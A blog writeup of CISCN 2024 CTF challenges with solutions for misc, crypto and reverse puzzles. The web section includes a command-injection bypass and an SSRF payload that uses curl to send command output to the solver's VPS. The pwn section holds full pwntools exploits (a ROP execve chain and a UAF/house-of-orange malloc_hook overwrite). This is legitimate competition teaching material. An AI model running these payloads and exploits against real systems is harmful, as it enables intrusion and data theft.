---
title: "CISCN2024"
description: "全国大学生信息安全竞赛 CISCN 2024 Writeup"

date: 2024-06-06T18:44:54+08:00
lastmod: 2025-11-10T16:26:54+08:00

math: true
mermaid: true

categories:
  - Writeup
tags:
  - CTF
---
<!--more-->

# Misc

## 火锅链观光打卡

微信公众号获得提示

![](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240518092106435-1906075373.jpg)

提示装插件

![image-20240518093832745](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240518093835503-63519121.png)

然后开始游戏，攒够7种不同的食物，兑换即可



![image-20240518092459544](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240518092502915-601390575.png)

flag{y0u_ar3_hotpot_K1ng}

## Power Trajectory Diagram

拷打gpt写读取npz文件的脚本

```python
import numpy as np

# 读取 .npz 文件
file_path = 'attachment.npz'
data = np.load(file_path)

# 打印文件中的数组名称
print("Arrays in the .npz file:")
print(data.files)

# 访问和打印每个数组
for array_name in data.files:
    array = data[array_name]
    print(f"\nArray name: {array_name}")
    print(array)
```

通过input、index、trace的内容可以分析出，它⼤概有13组数据每组数据对应⼀幅图，有点类似键盘敲击的

分析读取的三组数据，发现对应是13组图，每组数据对应一个最低点，再拷打gpt写个读取的最小值中的最大值

* exp

```python
import numpy as np

# 加载 .npz 文件中的数据
data = np.load("attachment.npz")

# 从 .npz 文件中提取 'index', 'trace', 和 'input' 数组
index = data['index']
trace = data['trace']
input_data = data['input']

# 初始化一个空字符串，用于存储结果
result = ""

# 遍历范围 12，处理 input_data 的每一个 40 行块
for i in range(12):
    # 获取当前块的 40 行数据
    table = input_data[40 * i: 40 * (i + 1)]

    # 对于每一行（共 40 行），找到 trace 中每一行的最小值的索引
    min_indices = [np.argmin(trace[i * 40 + j]) for j in range(40)]

    # 找到上一步计算的最小值索引中的最大值索引
    max_min_index = np.argmax(min_indices)

    # 将表格中对应于最大最小值索引的值添加到结果字符串中
    result += table[max_min_index]

# 打印最终的结果字符串，不添加额外的换行符
print(result, end="")

```

![image-20240519181705080](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240519181709916-367513063.png)



## 通风机

百度搜mwp文件咋打开

![image-20240519153949675](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240519153954328-756953515.png)

放进去发现提示不识别，用010打开后以及查看该文件头发现文件头缺失

先补全文件头

![image-20240519153507379](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240519153511943-1559805537.png)

用step工具打开

![image-20240519153632511](https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153636844-961689750.png)

base64解码

![image-20240519153712979](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240519153717629-1532464494.png)

## 神秘文件

将ppt文件转换为zip，文档打开找到，ppt信息里面也可以找到，懒得截图了
Part1:flag{e
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716106492580-26b1e005-7512-42d9-a272-151cd3f43b17.png)
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716107572564-18f01d74-a502-40d8-af18-9f2c23c4d3a4.png)
（算了还是截了）
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716107764486-62638e04-f9c4-4218-9de0-f56184826389.png)
解密
part2:675efb
里面有个word，搞成zip解压
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716107925246-fe0a3e99-3fbd-4c65-9069-b3e0db9b6c6d.png)
接着凯撒爆破base64
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716108031213-a6565110-6e74-4b6b-870b-4b311fdba2f9.png)
PArt3:3-34
alt+F11打开vba代码
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716108094760-e1590f14-1867-4228-8b08-26a43e592d5e.png)
问gpt是RC4（一直以为要写解密脚本！！！）
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716108192751-d5e40af9-9475-41b2-9ddc-31427c36089b.png)
Payt4:6f-40
PPT给图片掀开
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716108300557-25e6cd01-2729-47c5-9490-c04ef5a82deb.png)
base64解密
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716108384838-aa51d603-310f-4674-8b7f-5c29dec629ac.png)
pArt5:5f-90d
第五页ppt
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716108414303-ed12dfe7-8dfb-43f3-a604-53a7faa1c689.png)
多轮base64解密
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716108449233-8834d997-0c5b-4849-a675-1bb86e310e60.png)
ParT6:d-2
还是改为zip解压出来的题目里找到的
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716108629143-0d7aab51-366f-40f3-9ac2-efc31576b3bc.png)
base64
![image-20241008170036571](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008170038822-643052222.png)
PART7=22b3
在`ppt/slides/slide4.xml`下
![image-20241008170031528](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008170033866-1362623777.png)
![image-20241008170024696](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008170026874-785805001.png)
![image-20241008170016644](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008170019111-1441112012.png)
paRt8:87e
 `ppt\slideLayouts\slideLayout2.xml`下

![image-20241008170005421](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008170007771-1880325254.png)
可知密文去掉Bb13解base64

![image-20240607161418562](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607161420805-219422224.png)

 paRt8:87e

在`ppt\media`下
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008165915953-1059502503.png)
解密
![image-20240607161504364](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607161506857-1018305141.png)
PARt10:9}
维吉尼亚 key也有
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716109807249-dfa68f6f-b9b1-428a-987a-d0dcfc97440b.png)



密文ZYWJbIYnFhq9，加密方式是维吉尼亚加密， 密钥furry

## Tough_DNS

题目描述是一串16进制数据，解码

![image-20240519164104332](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240519164112092-139304058.png)

没解开，尝试通过逆序在进行16进制解码再逆序回来得到正常的数据

![image-20240607162350498](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607162353150-139741468.png)

在流量包中发现二进制域名

![image-20240519164500340](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240519164505210-2099247586.png)



利用工具将域名提取到一个文件中，将其保存

```txt
111111101100101111111111111101100101111111111111101100101111111111111101100101111111100000100100101000001100000100100101000001100000100100101000001100000100100101000001101110101010101011101101110101010101011101101110101010101011101101110101010101011101101110101001001011101101110101001001011101101110101001001011101101110101001001011101101110101110001011101101110101110001011101101110101110001011101101110101110001011101100000100000001000001100000100000001000001100000100000001000001100000100000001000001111111101010101111111111111101010101111111111111101010101111111111111101010101111111000000000110000000000000000000110000000000000000000110000000000000000000110000000000111100101010010011101111100101010010011101111100101010010011101111100101010010011101010010000010110111111010010000010110111111010010000010110111111010010000010110111111011001111000101100001011001111000101100001011001111000101100001011001111000101100001001110000110100001000001110000110100001000001110000110100001000001110000110100001000000101111001001100000000101111001001100000000101111001001100000000101111001001100000000000001111001110010000000001111001110010000000001111001110010000000001111001110010111111100100011010110111111100100011010110111111100100011010110111111100100011010110100000100011010000100100000100011010000100100000100011010000100100000100011010000100101110100001000010110101110100001000010110101110100001000010110101110100001000010110101110101110110100110101110101110110100110101110101110110100110101110101110110100110101110101011110101100101110101011110101100101110101011110101100101110101011110101100100000101110001111001100000101110001111001100000101110001111001100000101110001111001111111101111001111100111111101111001111100111111101111001111100111111101111001111100
```

尝试后，发现可能是二维码，利用工具将其转换成二维码

![image-20240607171708632](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607171710886-1959652525.png)

![image-20240607171652269](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607171654722-1330033081.png)

扫描出来的结果如下：

![image-20240519175729877](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240519175734479-2049718795.png)

通过分析后续流量，利用 tshark 脚本分别导出 0x6421，0x4500 所对应的数据

![image-20240607172534679](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607172537896-665304996.png)

利用命令分别提取数据

![image-20240607182517591](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607182520917-1525444214.png)

![image-20240607182544589](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607182547664-1913152725.png)

利用在线将其转换成文件

* 0x4500文件，是一个压缩包

![image-20240607182758675](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607182800749-1063011295.png)

发现是一个带锁的gpg文件，将压缩包给名为1.zip

* 0x6421是一个pgp文件

![image-20240607183020136](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607183022938-979978696.png)

将文件给名为2.pgp

![image-20240607183254268](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607183256747-1459349315.png)

提取gpg文件发现需要密码，结合题目，输入密码15f9792dba5c，拿到gpg文件

![image-20240607183428870](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607183431208-686758359.png)

利用PGPTool工具进行解密

![image-20240607185342884](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607185345779-1261008817.png)

![image-20240607185416426](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607185418567-2134737422.png)

密码为最开始根据题目描述得到的数据，e9b0-ea5f9bae这个密码不对，测试后发现还需要再逆序一下才行

![image-20240607185956491](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607185958858-329278782.png)

拿到flag

![image-20240607190111445](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607190113553-606034123.png)

# Web

## Simple_php

测试发现能够执行`php -v`命令

![image-20240518132248207](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240518132251631-1490700329.png)

因为存在过滤以及特殊函数`escapeshellcmd`，导致命令不能正常执行，可以构造十六进制数据结合`php -r`进行绕过

[在线字符串/十六进制互相转换—LZL在线工具 (lzltool.cn)](https://lzltool.cn/Toolkit/ConvertStringToHexadecimal)

![image-20240518132825429](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240518132828898-898802066.png)

![image-20240518134217969](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607112312423-1255600154.png)

测试后发现根目录没有flag，利用`php`读`/etc/passwd`文件

![image-20240518132329161](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240518132332745-1157496133.png)

发现Mysql服务，根据root用户的账户名和密码，弱口令尝试登陆root/root

![image-20240518133746619](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240518133750180-701643652.png)

![image-20240518134917547](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240518134922083-1666679704.png)

连接成功，进入PHP_CMS数据库，再查询表

![image-20240518133913511](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240518133916900-1553976194.png)

![image-20240518134834000](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240518134838056-1875913792.png)

继续查数据

![image-20240518134410050](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240518134413609-938358665.png)

![image-20240518134731217](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240518134735151-1797594180.png)

## easycms_revenge

根据第一天的flag内容提示需要伪造"REMOTE_ADDR"，但是这个不可伪造，需要通过ssrf来打，通过网上搜索发现该cms存在qrcode+ssrf漏洞

https://www.xunruicms.com/bug/

![image-20240519112814457](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240519112818817-518530127.png)

github源码审计找到qrcode函数

![image-20240519112621674](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240519112627631-54222019.png)

![image-20240519150551391](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240519150556186-876744862.png)

https://www.xunruicms.com/doc/444.html

查询文档发现参数可控，可以通过构造url来进行SSRF伪造进行外带，但是需要是一张**图片**能够使其识别

在自己的vps上写个文件`shell.php`，内容如下：

```php
#define width 8888
#define height 8888
<?php
header("location:http://127.0.0.1/flag.php?cmd=curl http://vpsip:port/?id=$(id)");
```

大概意思就是通过定义宽高来使其成为一张图片，绕过检测，再利用302跳转打SSRF

本地起一个python服务用来监听

![image-20240519113443683](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240519113448411-499464643.png)

访问题目：

`url/index.php?s=api&c=api&m=qrcode&size=100&level=10&thumb=http://vpsip/shell.php&text=1`

执行命令成功，利用`ls /|sed -n 1p`查看

![image-20240519113830661](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240519113835586-899329325.png)发现flag无法读取，继续遍历目录发现`readflag`可执行文件，输出readflag执行结果拿到flag

```php
#define width 8888
#define height 8888
<?php
header("location:http://127.0.0.1/flag.php?cmd=curl http://vpsip:port/?id=$(echo `/readflag`)");
```

![image-20240519114404928](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240519114409376-1817342022.png)

# Crypto

## OvO

先将e等式化简

![image-20240519153050449](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240519153056089-343697192.png)

可以看到化简方程最后只有p是未知，已知高位条件下e=(2+k)n，那么k=e//n-2，代入即可解出p的高位

已知p高位泄露直接打脚本即可

解题代码

```python
from Crypto.Util.number import *

n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967
e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104
c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823

k = e // n - 2
tmp = 65537 + (k+2)*n + (k+2)+1
R.<x> = PolynomialRing(RealField(1024))
f = e*x - (2*(k+1)*x^2 + (k+2)*n + tmp*x)
res = f.roots()

for root in res:
    p_high = int(root[0])
    PR.<x> = PolynomialRing(Zmod(n))
    f1 = x + p_high
    roots = f1.monic().small_roots(X=2^200,beta=0.4)
    if roots:
        p = int(roots[0]) + p_high
        q = n // p
        e = 65537 + k * p + (k+2) * ((p+1) * (q+1)) + 1
        d = inverse(e,(p-1)*(q-1))
        m = pow(c,d,n)
        print(long_to_bytes(int(m)))
```

![image-20240519153128716](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240519153140820-1858714848.png)

## 古典密文

![image-20240519153310923](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240519153315904-1153606556.png)

# Reverse

## asm_re

一开始还想还原这个ida工程文件hhh，发现根本做不到，后面纯看arm汇编代码，直接手撕就好，加密逻辑在这儿，密文一开始还找半天，后面发现应该是存在变量unk_100003F10里面
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716107133474-6dd6bd70-f747-4e79-82d0-bd71353915ef.png)

搓出脚本之后也还是卡了一小会儿，最后反应过来大小端的问题，改一下小端就好了，爆破一下直接出
exp:

```python
k = [
    0x1fd7, 0x21b7, 0x1e47, 0x2027, 0x26e7, 0x10d7, 0x1127, 0x2007,
    0x11c7, 0x1e47, 0x1017, 0x1017, 0x11f7, 0x2007, 0x1037, 0x1107,
    0x1f17, 0x10d7, 0x1017, 0x1017, 0x1f67, 0x1017, 0x11c7, 0x11c7,
    0x1017, 0x1fd7, 0x1f17, 0x1107, 0x0f47, 0x1127, 0x1037, 0x1e47,
    0x1037, 0x1fd7, 0x1107, 0x1fd7, 0x1107, 0x2787
]

for i in range(len(k)):
    for j in range(128): 
        if (((j * ord('P') + 0x14) ^ ord('M')) + 0x1e) == k[i]:
            print(chr(j), end="") 
#flag{67e9a228e45b622c2992fb5174a4f5f5}
```

## whereThel1b

还真是第一次遇见这种，给了个so和一个py文件，一开始的想法是能不能给so解包之类的，因为py文件里面密文给了，就差一个加密逻辑，找了一大圈还是没找到，最后还是想到了调一下so文件，像调安卓那样
动调起来锁定出了两个函数，得知输入的数据先经过base64编码之后再进行的异或![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716109884779-17e06c83-6fc5-4814-bd3c-48dc2b4e2d3b.png)
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716109932327-1f17bb8d-f10b-4e67-b587-873ccedb086b.png)
加密逻辑知道了，但是不知道异或的值是什么，一开始以为是存在r18里面的，最后调了一下找不到规律，最后想到重新写一份密文输入，然后把加密之后的数据输出一下，前后异或得到所需异或的值，想办法输入一个输构造出经过base64编码之后长度为56的数
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716110117071-af6369b0-a2ff-4e9b-a55e-3bb343104144.png)
exp:
其中aa是上图构造的“55555555555555555555555555555555555555555555”的base64之后的值，然后bb是运行上图之后得到的异或之后的值，最后运行出来的结果解一下base64就行

```python
encry = [108, 117, 72, 80, 64, 49, 99, 19, 69, 115, 94, 93, 94, 115, 71, 95, 84, 89, 56, 101, 70, 2, 84, 75, 127, 68, 103, 85, 105, 113, 80, 103, 95, 67, 81, 7, 113, 70, 47, 73, 92, 124, 93, 120, 104, 108, 106, 17, 80, 102, 101, 75, 93, 68, 121, 26]

aa = [78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49]
bb = [120, 76, 101, 9, 84, 86, 69, 17, 81, 77, 103, 4, 93, 74, 67, 20, 67, 116, 93, 35, 70, 100, 83, 22, 125, 68, 119, 28, 125, 114, 92, 34, 72, 122, 81, 7, 101, 65, 75, 18, 72, 66, 78, 37, 105, 124, 88, 18, 80, 72, 98, 16, 94, 87, 102, 18]

for i in range(len(aa)):
    print(chr(((aa[i]^bb[i]))^encry[i]),end='')
#ZmxhZ3s3ZjlhMmQzYy0wN2RlLTExZWYtYmU1ZS1jZjFlODg2NzRjMGJ9
```

![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716110388906-19b8d9e8-944d-4754-abc1-bb32539cf928.png)

## gdb_debug

进入主函数之后逻辑还是相当清楚的，锁定了一下伪随机数
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1716108171134-d0c78cae-29d9-40d8-98cb-2cc66768bf09.png)
动调跑起来取出随机数

```php
0xd9, 0x0f, 0x18, 0xBD, 0xC7, 0x16, 0x81, 0xbe, 0xf8, 0x4A, 0x65, 0xf2, 0x5D, 0xab, 0x74, 0x33, 0xd4, 0xa5, 0x67, 0x98, 0x9f, 0x7E, 0x2B, 0x5D, 0xc2, 0xaf, 0x8e, 0x3A, 0x4C, 0xa5, 0X75, 0X25, 0xb4, 0x8d, 0xe3, 0X7B, 0xa3, 0x64
```

然后直接从后往前逆就好
exp:

```c
#include <stdio.h>

int main() {
    int indexArray[38];
    int buffer[38];
    int outputBuffer[38];
    int originalNumbers[] = {
        94, 30, 2, 68, 157, 32, 134, 99, 227, 214,
        182, 105, 24, 193, 153, 168, 188, 5, 121, 159,
        25, 110, 218, 76, 117, 174, 192, 185, 247, 122,
        149, 77, 23, 135, 148, 84, 191, 185
    };
    unsigned char byteSequence[] = {
        128, 180, 64, 184, 148, 200, 52, 101, 238, 69,
        215, 157, 60, 136, 140, 169, 107, 174, 125, 135,
        214, 135, 15, 218, 70, 100, 57, 147, 169, 144,
        184, 113, 131, 232, 172, 201, 231, 83
    };
    unsigned int shuffledIndices[38];
    for (int i = 0; i < 38; i++) {
        shuffledIndices[i] = originalNumbers[i] ^ byteSequence[i];
    }
    int encryptionKeys[] = {0xd9, 0x0f, 0x18, 0xBD, 0xC7, 0x16, 0x81, 0xbe, 0xf8, 0x4A, 0x65, 0xf2, 0x5D, 0xab, 0x74, 0x33, 0xd4, 0xa5, 0x67, 0x98, 0x9f, 0x7E, 0x2B, 0x5D, 0xc2, 0xaf, 0x8e, 0x3A, 0x4C, 0xa5, 0x75, 0x25, 0xb4, 0x8d, 0xe3, 0x7B, 0xa3, 0x64};
    int permutationOrder[] = {33, 0, 10, 0, 32, 31, 10, 29, 9, 24, 26, 11, 20, 24, 21, 3, 12, 10, 13, 2, 15, 4, 13, 10, 8, 3, 3, 6, 0, 4, 1, 1, 5, 4, 0, 0, 1};
    unsigned char dataXor[] = {0xBF, 0xD7, 0x2E, 0xDA, 0xEE, 0xA8, 0x1A, 0x10, 0x83, 0x73, 0xAC, 0xF1, 0x06, 0xBE, 0xAD, 0x88, 0x04, 0xD7, 0x12, 0xFE, 0xB5, 0xE2, 0x61, 0xB7, 0x3D, 0x07, 0x4A, 0xE8, 0x96, 0xA2, 0x9D, 0x4D, 0xBC, 0x81, 0x8C, 0xE9, 0x88, 0x78};
    char inputData[] = "congratulationstoyoucongratulationstoy";

    for (int i = 0; i < 38; i++) {
        indexArray[i] = i;
    }
    for (int k = 37; k > 0; --k) {
        int swapIndex = permutationOrder[37 - k] % (k + 1);
        int tempIndex = indexArray[k];
        indexArray[k] = indexArray[swapIndex];
        indexArray[swapIndex] = tempIndex;
    }
    for (int i = 0; i < 38; i++) {
        buffer[i] = shuffledIndices[i] ^ inputData[i] ^ dataXor[i];
        outputBuffer[indexArray[i]] = encryptionKeys[indexArray[i]] ^ buffer[i];
    }
    for (int i = 0; i < 38; i++) {
        printf("%c", outputBuffer[i]);
    }
    return 0;
}
```

# Pwn

## gostack

IDA8.3补全符号表，开了个NX，不影响打栈溢出 

* exp

````python
# -*- coding=utf-8 -*
from pwn import *
from LibcSearcher import *

p = remote("8.147.133.63", 17147)
elf = ELF('./gostack')
libc = elf.libc

syscall = 0x404043
rax_ret = 0x40f984
rdi_ret = 0x4a18a5
rsi_ret = 0x42138a
rdx_ret = 0x4944ec
p.recvuntil('message :')
payload = b'a' * 0x100 + p64(elf.bss()) + p64(0x10) + p64(0) * 0x18
payload += p64(rdi_ret) + p64(0) * 6 + p64(rsi_ret) + p64(elf.bss() + 0x200) + p64(rdx_ret) + p64(0x100) + p64(rax_ret) + p64(0) + p64(syscall)
payload += p64(rdi_ret) + p64(elf.bss() + 0x200) + p64(0) * 5
payload += p64(rdi_ret) + p64(elf.bss() + 0x200) + p64(0) * 5
payload += p64(rdi_ret) + p64(elf.bss() + 0x200) + p64(0) * 5 + p64(rsi_ret) + p64(0) + p64(rdx_ret) + p64(0) + p64(rax_ret) + p64(59) + p64(syscall)
p.sendline(payload)
input()
p.send('/bin/sh\x00')
p.interactive()
````

## orange_cat_diar

有个UAF

![image-20240607114610173](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607114611892-716076837.png)

然后就是house of orange，打unsorted bin attack泄露libc基址，然后改malloc_hook

* exp

```python
from pwn import *

context.log_level = 'debug'
# p=process('./orange_cat_diary')
p = remote('8.147.128.251', 17907)
libc = ELF('./libc-2.23.so')

def choice(i):
    p.sendlineafter('choice:', str(i))
def add(size, content):
    choice(1)
    p.sendlineafter('content:', str(size))
    p.sendafter('content:', content)
def edit(size, content):
    choice(4)
    p.sendlineafter('content:', str(size))
    p.sendafter('content:', content)

p.sendafter('name.', 'rweb')
add(0x68, b'a')
edit(0x70, b'a' * 0x68 + p64(0x0f91))
add(0x1000, b'a')
add(0x18, b'a' * 8)
choice(2)
libc_addr = u64(p.recvuntil(b'\x7f')[-6:] + b'\0\0') - 1640 - 0x10
libc.sym['__malloc_hook']
success('libc_addr: ' + hex(libc_addr))
one = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
add(0x68, b'a')
choice(3)
edit(0x10, p64(libc_addr + libc.sym['__malloc_hook'] - 0x23))
add(0x68, b'a')
add(0x68, b'a' * (0x13) + p64(libc_addr + one[2]))
choice(1)
p.sendlineafter('content:', str(0x20))
p.interactive()
```

